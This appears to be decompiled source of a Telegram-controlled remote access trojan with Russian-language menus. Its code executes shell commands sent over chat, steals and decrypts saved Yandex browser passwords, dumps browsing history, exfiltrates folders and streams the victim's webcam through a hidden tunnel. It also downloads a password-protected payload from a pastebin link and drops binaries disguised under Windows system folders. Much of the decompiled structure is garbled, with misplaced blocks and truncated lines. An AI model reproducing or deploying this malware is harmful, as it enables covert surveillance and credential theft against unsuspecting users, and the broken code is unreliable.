global current_directory  # inserted
global tunnel_process  # inserted
global ffmpeg_process  # inserted
import asyncio
import asyncio.subprocess as aio_subprocess
import base64
import ctypes
import datetime
import getpass
import json
import logging
import os
import platform
import re
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import time
import wave
import zipfile
import webbrowser
from concurrent.futures import ThreadPoolExecutor
import aiohttp
import imageio
import numpy as np
import psutil
import pyautogui
import pyperclip
import pyzipper
import requests
import sounddevice as sd
import win32crypt
import socket
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import ContentType, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, InlineKeyboardButton, ContentType, FSInputFile
from comtypes import CLSCTX_ALL
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from Crypto.Cipher import AES
from PIL import ImageGrab
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import POINTER, cast

def read_appended_data_vars(arg):
    exe_path = sys.executable
    with open(exe_path, 'rb') as file:
        content = file.read()
    marker = b'--MYDATA--\n'
    if marker in content:
        data = content.split(marker)[(-1)]
        data_str = data.decode('utf-8')
        namespace = {}
        exec(data_str, {}, namespace)
        if arg == 'api':
            api = namespace.get('Api')
            return api
        if arg == 'user_id':
            user_ids = namespace.get('user_id')
            return user_ids
API_TOKEN = read_appended_data_vars('api')
ALLOWED_USER_ID = read_appended_data_vars('user_id')
directory = 'C:/Users/Public/main'
os.makedirs(directory, exist_ok=True)
STATIC_DIR = 'C:\\ProgramData\\Windows App Certification Kit\\static'
os.makedirs(STATIC_DIR, exist_ok=True)
cloudflared_floader = 'C:\\ProgramData\\cloudflared'
os.makedirs(cloudflared_floader, exist_ok=True)
cloudflared_path = os.path.join(cloudflared_floader, 'cloudflared-windows-amd64.exe')
ffmpeg_floader = 'C:\\ProgramData\\ffmpeg-7.1.1-essentials_build\\bin'
os.makedirs(ffmpeg_floader, exist_ok=True)
ffmpeg_path = os.path.join(ffmpeg_floader, 'ffmpeg.exe')
flask_floader = 'C:\\Windows\\SysWOW64'
flask_name = 'SysNetAgent.exe'
os.makedirs(flask_floader, exist_ok=True)
flask_path = os.path.join(flask_floader, flask_name)
url = 'https://pastebin.com/raw/SeyVcXbn'
bot = Bot(token=API_TOKEN)
dp = Dispatcher()
MAX_MESSAGE_LENGTH = 4096
a = np.random.randint(10000000, 99999999)
START_TIME = datetime.datetime.now().timestamp()
kb = [[types.KeyboardButton(text='–ê–Ω—Ç–∏–≤–∏—Ä—É—Å'), types.KeyboardButton(text='–°–∫—Ä–∏–Ω—à–æ—Ç')], [types.KeyboardButton(text='–ü—Ä–æ—Ü–µ—Å—ã'), types.KeyboardButton(text='–§–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã')], [types.KeyboardButton(text='–ü–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç –ø–æ –ø—Ä–æ—Ü–µ—Å–∞–º'), types.KeyboardButton(text='–ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å')], [types.KeyboardButton(text='–°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É'), types.KeyboardButton(text='–£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É')], [types.KeyboardButton(text='–°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏'), types.KeyboardButton(text='–ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å—Å—è –ø–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏')], [types.KeyboardButton(text='–î–∞–Ω–Ω—ã–µ –ü–ö'), types.KeyboardButton(text='–û–∫–Ω–æ —Å –≤–∞—à–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º')], [types.KeyboardButton(text='–ó–∞–ø–∏—Å—å —Å –≤–µ–± –∫–∞–º–µ—Ä—ã'), types.KeyboardButton(text='–ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ')], [types.KeyboardButton(text='–¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è —Å –≤–µ–± –∫–∞–º–µ—Ä—ã'), types.KeyboardButton(text='–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤–µ–±-—Ç—Ä–∞–Ω—Å–ª—è—Ü–∏—é')], [types.KeyboardButton(text='–û—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª'), types.KeyboardButton(text='–ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª')], [types.KeyboardButton(text='–°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª'), types.KeyboardButton(

@dp.message(Command('start'))
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        keyboard = types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
        await message.answer('–ì–æ—Ç–æ–≤ –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é', reply_markup=keyboard)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–Ω–∞–∑–∞–¥')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        keyboard = types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
        await message.answer('–í–æ–∑–≤—Ä–∞—â–∞—é—Å—å –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=keyboard)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '—Å—Ç–∏–ª–ª–µ—Ä')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        kb = [[types.KeyboardButton(text='–ü–∞—Ä–æ–ª–∏ —Ö—Ä–æ–º–∞'), types.KeyboardButton(text='–ü–∞—Ä–æ–ª–∏ –æ–ø–µ—Ä—ã GX'), types.KeyboardButton(text='–ü–∞—Ä–æ–ª–∏ —è–Ω–¥–µ–∫—Å–∞'), types.KeyboardButton(text='–ü–∞—Ä–æ–ª–∏ edge')], [types.KeyboardButton(text='–ò—Å—Ç–æ—Ä–∏—è —Ö—Ä–æ–º–∞'), types.KeyboardButton(text='–ò—Å—Ç–æ—Ä–∏—è –æ–ø–µ—Ä—ã GX'), types.KeyboardButton(text='–ò—Å—Ç–æ—Ä–∏—è —è–Ω–¥–µ–∫—Å–∞'), types.KeyboardButton(text='–ò—Å—Ç–æ—Ä–∏—è edge')], [types.KeyboardButton(text='Txt —Ñ–∞–π–ª—ã —Å —Ä–æ–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞')], [types.KeyboardButton(text='–ù–∞–∑–∞–¥')]]
        keyboard = types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
        await message.answer('–í—ã–±–µ—Ä–∏—Ç–µ —Ñ—É–Ω–∫—Ü–∏—é:', reply_markup=keyboard)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
ffmpeg_process = None
tunnel_process = None

async def kill_process_by_name(process_name):
    try:
        subprocess.run(['taskkill', '/IM', process_name, '/F'], check=True, **get_subprocess_kwargs())
    except subprocess.CalledProcessError:
        return

async def free_port(start=1000, end=65535):
    for port in range(start, end + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(0.01)
            result = sock.connect_ex(('127.0.0.1', port))
            if result!= 0:
                return port

def get_subprocess_kwargs():
    kwargs = {}
    if sys.platform == 'win32':
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        kwargs['startupinfo'] = startupinfo
        kwargs['creationflags'] = subprocess.CREATE_NO_WINDOW
    return kwargs

async def run_ffmpeg():
    global ffmpeg_process  # inserted

    def get_devices(device_type):
        command = [ffmpeg_path, '-list_devices', 'true', '-f', 'dshow', '-i', 'dummy']
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, **get_subprocess_kwargs())
        devices = []
        for line in result.stderr.splitlines():
            if device_type in line:
                devices.append(line.split('\"')[1])
        return devices

    def is_device_working(device_name, device_type):
        if device_type == 'video':
            cmd = [ffmpeg_path, '-f', 'dshow', '-i', f'video={device_name}', '-t', '1', '-f', 'null', '-']
        else:  # inserted
            cmd = [ffmpeg_path, '-f', 'dshow', '-i', f'audio={device_name}', '-t', '1', '-f', 'null', '-']
        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, **get_subprocess_kwargs())
        return res.returncode == 0
    video_dev = next((d for d in get_devices('video') if is_device_working(d, 'video')), None)
    audio_dev = next((d for d in get_devices('audio') if is_device_working(d, 'audio')), None)
    if not video_dev or not audio_dev:
        print('–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –≤–∏–¥–µ–æ- –∏–ª–∏ –∞—É–¥–∏–æ—É—Å—Ç—Ä–æ–π—Å—Ç–≤.')
        return
    if ffmpeg_process and ffmpeg_process.returncode is None:
        return
    cmd = [ffmpeg_path, '-f', 'dshow', '-i', f'video={video_dev}:audio={audio_dev}', '-vcodec', 'libx264', '-preset', 'ultrafast', '-tune', 'zerolatency', '-acodec', 'aac', '-ar', '44100', '-ac', '2', '-b:v', '800k', '-b:a', '128k', '-f', 'hls', '-hls_time', '2', '-hls_list_size', '5', '-hls_flags', 'delete_segments+append_list+omit_endlist', '-hls_allow_cache', '0', os.path.join(STATIC_DIR, 'stream.m3u8')]
    creationflags = 0
    startupinfo = None
    if sys.platform == 'win32':
        creationflags = subprocess.CREATE_NO_WINDOW
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    ffmpeg_process = await aio_subprocess.create_subprocess_exec(*cmd, stdout=aio_subprocess.PIPE, stderr=aio_subprocess.STDOUT, creationflags=creationflags, startupinfo=startupinfo)

async def run_tunnel(chat_id, bot_instance, port):
    global tunnel_process  # inserted
    creationflags = 0
    startupinfo = None
    if sys.platform == 'win32':
        creationflags = subprocess.CREATE_NO_WINDOW
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    tunnel_process = await asyncio.create_subprocess_exec(cloudflared_path, 'tunnel', '--url', f'http://localhost:{port}', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, creationflags=creationflags, startupinfo=startupinfo)
    pattern = re.compile('(https?://[^\\s]+trycloudflare\\.com\\S*)')
    pass
@dp.message(F.text.lower() == '—Ç—Ä–∞–Ω—Å–ª—è—Ü–∏—è —Å –≤–µ–± –∫–∞–º–µ—Ä—ã')
async def start_stream(message: types.Message):
    if getattr(start_stream, 'is_running', False):
        return await message.answer('–¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è —É–∂–µ –∑–∞–ø—É—â–µ–Ω–∞!')
    else:  # inserted
        if os.path.isfile(ffmpeg_path) and os.path.isfile(cloudflared_path) and os.path.isfile(flask_path):
            break
        dan = await message.answer('–ü–æ–¥–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–æ–≤ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏–∏...')
        response = requests.get(url)
        if response.status_code == 200:
            data = json.loads(response.text)
            link_sourse = data['sources']
            print(link_sourse)
        else:  # inserted
            link_sourse = 'none'
        cloudflared_name = 'cloudflared-windows-amd64.exe'
        ffmpeg_name = 'ffmpeg.exe'
        await kill_process_by_name(cloudflared_name)
        await kill_process_by_name(ffmpeg_name)
        await kill_process_by_name(flask_name)
        await asyncio.sleep(5)
        zip_path = os.path.join(directory, 'sourse.zip')
        response = requests.get(link_sourse)
        if response.status_code == 200:
            with open(zip_path, 'wb') as f:
                f.write(response.content)
            cloudflared_name = 'cloudflared-windows-amd64.exe'
            ffmpeg_name = 'ffmpeg.exe'
            password = 'BatRat'
            with pyzipper.AESZipFile(zip_path) as zf:
                zf.pwd = password.encode()
                with zf.open(cloudflared_name) as src:
                    with open(os.path.join(cloudflared_floader, os.path.basename(cloudflared_name)), 'wb') as dst:
                        dst.write(src.read())
                with zf.open(ffmpeg_name) as src:
                    with open(os.path.join(ffmpeg_floader, os.path.basename(ffmpeg_name)), 'wb') as dst:
                        dst.write(src.read())
                with zf.open(flask_name) as src:
                    with open(os.path.join(flask_floader, os.path.basename(flask_name)), 'wb') as dst:
                        dst.write(src.read())
            if os.path.exists(zip_path):
                os.remove(zip_path)
            await dan.edit_text('–§–∞–π–ª—ã —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω—ã! ‚úÖ')
        else:  # inserted
            await message.answer('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏–∏, –ø–æ—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ ‚ùå')
        cloudflared_name = 'cloudflared-windows-amd64.exe'
        ffmpeg_name = 'ffmpeg.exe'
        await kill_process_by_name(cloudflared_name)
        await kill_process_by_name(ffmpeg_name)
        await kill_process_by_name(flask_name)
        await asyncio.sleep(1)
        try:
            msg = await message.answer('–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–º–µ—Ä—ã üìπ')
        except Exception:
                reader = imageio.get_reader('<video0>')
                _ = reader.get_next_data()
                reader._close()
            else:  # inserted
                await msg.edit_text('–ó–∞–ø—É—Å–∫ —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏–∏ üî¥')
        return await message.answer('–ö–∞–º–µ—Ä–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –∏–ª–∏ –∑–∞–Ω—è—Ç–∞ –¥—Ä—É–≥–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º.')

@dp.message(F.text.lower() == '–æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤–µ–±-—Ç—Ä–∞–Ω—Å–ª—è—Ü–∏—é')
async def stop_stream(message: types.Message):
    if not getattr(start_stream, 'is_running', False):
        return await message.answer('–¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è –Ω–µ –∑–∞–ø—É—â–µ–Ω–∞.')
    else:  # inserted
        start_stream.is_running = False
        for task in start_stream.tasks:
            if not task.done():
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass  # postinserted
        else:  # inserted
            if ffmpeg_process and ffmpeg_process.returncode is None:
                ffmpeg_process.terminate()
            if tunnel_process and tunnel_process.returncode is None:
                tunnel_process.terminate()
            await kill_process_by_name(flask_name)
        for file in os.listdir(STATIC_DIR):
            if file.endswith('.ts') or file.endswith('.m3u8'):
                os.remove(os.path.join(STATIC_DIR, file))
        await message.answer('–¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞.')
        pass

async def send_text_in_parts(message: types.Message, text: str):
    parts = [text[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(text), MAX_MESSAGE_LENGTH)] for part in parts if await message.reply(f'`{part}`', parse_mode='Markdown') == https://pastebin.com/raw/SeyVcXbn
active_sessions = {}

@dp.message(F.text.lower() == '–∫–æ–º–∞–Ω–¥—ã –≤ cmd')
async def start_cmd(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        user_id = message.from_user.id
        active_sessions[user_id] = True
        await message.reply('–í—ã –≤–æ—à–ª–∏ –≤ —Ä–µ–∂–∏–º CMD. –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –∏–ª–∏ –Ω–∞–ø–∏—à–∏—Ç–µ \'—Å—Ç–æ–ø\', —á—Ç–æ–±—ã –≤—ã–π—Ç–∏ –∏–∑ —Ä–µ–∂–∏–º–∞.')

@dp.message(lambda message: message.from_user.id in active_sessions)
async def handle_cmd_command(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        user_id = message.from_user.id
        if active_sessions.get(user_id):
            if message.text.lower() == '—Å—Ç–æ–ø':
                active_sessions.pop(user_id, None)
                await message.reply('–í—ã –≤—ã—à–ª–∏ –∏–∑ —Ä–µ–∂–∏–º–∞ CMD.')
                return
            else:  # inserted
                command = message.text
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8')
                    output = result.stdout.strip() or result.stderr.strip() or '–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ, –Ω–æ –±–µ–∑ –≤—ã–≤–æ–¥–∞.'
                    await send_text_in_parts(message, output)
                except Exception as e:
                    pass  # postinserted
        await message.reply(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã: {e}')

class WaitingForInput(StatesGroup):
    user_box_message = State()
    waiting_for_download_folder_path = State()
    waiting_for_pid = State()
    waiting_for_new_folder_path = State()
    waiting_for_folder_delete_path = State()
    waiting_for_download_file_path = State()
    waiting_for_file_delete_path = State()
    waiting_for_directory_path = State()
    waiting_for_screen_recording_duration = State()
    waiting_for_webcam_recording_duration = State()
    waiting_for_file_open_path = State()
    waiting_for_clipboard_change = State()
    waiting_for_url_open = State()
    waiting_for_file_encryption_path = State()
    waiting_for_file_decryption_path = State()
    waiting_for_cmd_window_count = State()
    waiting_for_wallpaper_image = State()
    waiting_for_self_destruction_code = State()
    waiting_for_file_move_source_path = State()
    waiting_for_file_move_destination_path = State()
    waiting_for_audio_recording_duration = State()
    waiting_for_file_upload_destination_path = State()
    waiting_for_file_upload = State()

@dp.message(F.text.lower() == '–æ–∫–Ω–æ —Å –≤–∞—à–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º')
async def give_maessage(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è —Å–æ–æ–±—â–µ–Ω–∏—è\\:*', parse_mode='MarkdownV2')
        await state.set_state(WaitingForInput.user_box_message)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.user_box_message)
async def maessage(message: types.Message, state: FSMContext):
    src_folder = message.text
    powershell_script = f'\n$wshell = New-Object -ComObject WScript.Shell\n$wshell.Popup(\'{src_folder}\', 0, \'–°–æ–æ–±—â–µ–Ω–∏–µ\', 0x40 + 0x40000)  # 0x40 - –∏–∫–æ–Ω–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, 0x40000 - –ø–æ–≤–µ—Ä—Ö –≤—Å–µ—Ö –æ–∫–æ–Ω\n    '
    try:
        subprocess.Popen(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', powershell_script], creationflags=subprocess.CREATE_NO_WINDOW)
        await asyncio.sleep(1.2)
    except:
        pass  # postinserted
    await message.answer('*–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –∫–æ–º–∞–Ω–¥—ã* ‚ùå', parse_mode='MarkdownV2')
            await message.answer('*–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ* üí¨', parse_mode='MarkdownV2')
    await state.clear()

@dp.message(F.text.lower() == '—Å–∫–∞—á–∞—Ç—å –ø–∞–ø–∫—É')
async def Path_floader(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('*–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∏ –≤–∫–æ–Ω—Ü–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø–∞–ø–∫–∏\\, –ø—Ä–∏–º–µ—Ä:*\n \'C:/Users/Public/–ù–∞–∑–≤–∞–Ω–∏–µ\\_–ø–∞–ø–∫–∏\'', parse_mode='MarkdownV2')
        await state.set_state(WaitingForInput.waiting_for_download_folder_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_download_folder_path)
async def Dowloand_floader(message: types.Message, state: FSMContext):
    src_folder = message.text
    if os.path.isdir(src_folder):
        total_size = sum((os.path.getsize(os.path.join(root, file)) for root, _, files in os.walk(src_folder) for file in files))
        size_mb = total_size / 1048576
    else:  # inserted
        await message.answer('–ü–∞–ø–∫–∞ –Ω–µ –Ω–∞–∏ÃÜ–¥–µ–Ω–∞')
        await state.clear()
        archive_path = os.path.join(directory, 'folder_backup.zip')
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as archive:
            for root, _, files in os.walk(src_folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, src_folder)
                    archive.write(file_path, arcname)
        size_mb = os.path.getsize(archive_path) / 1048576
        if size_mb > 50:
            await message.answer('–†–∞–∑–º–µ—Ä –ø–∞–ø–∫–∏ –ø—Ä–µ–≤—ã—à–∞–µ—Ç 50 –º–µ–≥–∞–±–∞–∏ÃÜ—Ç. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –¥—Ä—É–≥–æ–π –ø—É—Ç—å.')
            os.remove(archive_path)
            await state.clear()
        else:  # inserted
            if False:
                pass  # postinserted
            await message.answer_document(document=FSInputFile(archive_path), caption='üìÇ –ü–∞–ø–∫–∞')
            os.remove(archive_path)
            await state.clear()

@dp.message(F.text.lower() == '–∏—Å—Ç–æ—Ä–∏—è —è–Ω–¥–µ–∫—Å–∞')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        def get_yandex_history():
            local_path = os.getenv('LOCALAPPDATA')
            yandex_path = os.path.join(local_path, 'Yandex', 'YandexBrowser', 'User Data')
            if not os.path.exists(yandex_path):
                return (False, '–Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω.')
            text_to_save = ''
            for profile in os.listdir(yandex_path):
                profile_path = os.path.join(yandex_path, profile)
                if os.path.isdir(profile_path) and 'History' in os.listdir(profile_path):
                    history_path = os.path.join(profile_path, 'History')
                    temp_history_path = os.path.join(directory, 'temp_history')
                    shutil.copy2(history_path, temp_history_path)
                    try:
                        conn = sqlite3.connect(temp_history_path)
                        cursor = conn.cursor()
                        query = '\n                        SELECT urls.url, urls.title, urls.last_visit_time\n                        FROM urls\n                        ORDER BY last_visit_time DESC\n                        '
                        cursor.execute(query)
                        rows = cursor.fetchall()
                        text_to_save += f'--- –ò—Å—Ç–æ—Ä–∏—è –ø—Ä–æ—Ñ–∏–ª—è: {profile} ---\n'
                        for row in rows:
                            url = row[0]
                            title = row[1]
                            last_visit_time = row[2]
                except Exception as e:
                        else:  # inserted
                            try:
                                if last_visit_time > 0:
                                    last_visit_time = last_visit_time / 1000000 - 11644473600
                                    last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
                                else:  # inserted
                                    last_visit_time = 'Invalid time'
                            except (OSError, ValueError) as e:
                                pass  # postinserted
                            else:  # inserted
                                text_to_save += f'URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n'
                        else:  # inserted
                            conn.close()
                        else:  # inserted
                            os.remove(temp_history_path)
            else:  # inserted
                if not text_to_save:
                    return (False, '–Ø–Ω–¥–µ–∫—Å –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.')
                file_path = os.path.join(directory, 'üìÇ –ò—Å—Ç–æ—Ä–∏—è_–Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞.txt')
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write(text_to_save)
                    return (True, file_path)
                last_visit_time = f'Error: {str(e)}'
                text_to_save += f'–û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ –∏—Å—Ç–æ—Ä–∏–∏ –ø—Ä–æ—Ñ–∏–ª—è {profile}: {e}\n\n'
        await message.answer('–ü–æ–ª—É—á–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏ –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...')
        success, result = get_yandex_history()
        if not success:
            await message.answer(result)
            return
        else:  # inserted
            file_path = result
            try:
                file_to_send = FSInputFile(file_path)
                await message.answer_document(document=file_to_send, caption='–í–æ—Ç –≤–∞—à —Ñ–∞–π–ª —Å –∏—Å—Ç–æ—Ä–∏–µ–π!')
            except Exception as e:
                    if os.path.exists(file_path):
                        os.remove(file_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {e}')

@dp.message(F.text.lower() == '–ø–∞—Ä–æ–ª–∏ —è–Ω–¥–µ–∫—Å–∞')
async def yandex_passwords(message: types.Message):
    LOCAL_STATE_PATH = os.path.expandvars('%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Local State')
    DB_PATH = os.path.expandvars('%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data')
    Yandex_path = os.path.join(os.getcwd(), 'Yandex.txt')

    def get_encryption_key():
        try:
            with open(LOCAL_STATE_PATH, 'r', encoding='utf-8') as f:
                pass  # postinserted
        except Exception as e:
                local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    encrypted_key = encrypted_key[5:]
                    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return None
            else:  # inserted
                pass

    def decrypt_password(encrypted_value, key):
        try:
            if encrypted_value.startswith(b'\xd0b'):
                encrypted_value = encrypted_value[2:]
            if len(encrypted_value) < 28:
                return '–û—à–∏–±–∫–∞: –¥–∞–Ω–Ω—ã–µ —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–µ'
            iv = encrypted_value[:12]
            ciphertext = encrypted_value[12:(-16)]
            tag = encrypted_value[(-16):]
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8', errors='replace')
        except ValueError:
            return '–û—à–∏–±–∫–∞: MAC check failed'
        except Exception as e:
            return f'–û—à–∏–±–∫–∞: {str(e)}'

    async def get_saved_passwords():
        try:
            key = get_encryption_key()
            if not key:
                pass  # postinserted
        except Exception as e:
            else:  # inserted
                try:
                    pass  # postinserted
                conn.close()
            conn = sqlite3.connect(DB_PATH)
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute('\n                SELECT action_url, username_value, password_value \n                FROM logins \n                WHERE password_value IS NOT NULL\n            ')
            with open(Yandex_path, 'w', encoding='utf-8') as f:
                for row in cursor.fetchall():
                    try:
                        url, user, pwd = row
                        if not user or not url:
                            continue
                        decrypted = decrypt_password(pwd, key)
                        decoded_url = url.decode('utf-8', errors='replace') if url else ''
                        decoded_user = user.decode('utf-8', errors='replace') if user else ''
                        f.write(f'URL: {decoded_url}\n')
                        f.write(f'User: {decoded_user}\n')
                        f.write(f'Password: {decrypted}\n')
                        f.write('==================================================\n')
                    except Exception as e:
                        pass  # postinserted
                else:  # inserted
                    try:
                        pass  # postinserted
                    conn.close()
                    return True
                    f.write(f'–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∑–∞–ø–∏—Å–∏: {str(e)}\n')
                    f.write('==================================================\n')
                return False
    if await get_saved_passwords():
        try:
            await message.answer_document(document=FSInputFile(Yandex_path), caption='üìÇ –ò—Å—Ç–æ—Ä–∏—è –ø–∞—Ä–æ–ª–µ–π –Ø–Ω–¥–µ–∫—Å')
        except Exception as e:
            pass  # postinserted
    else:  # inserted
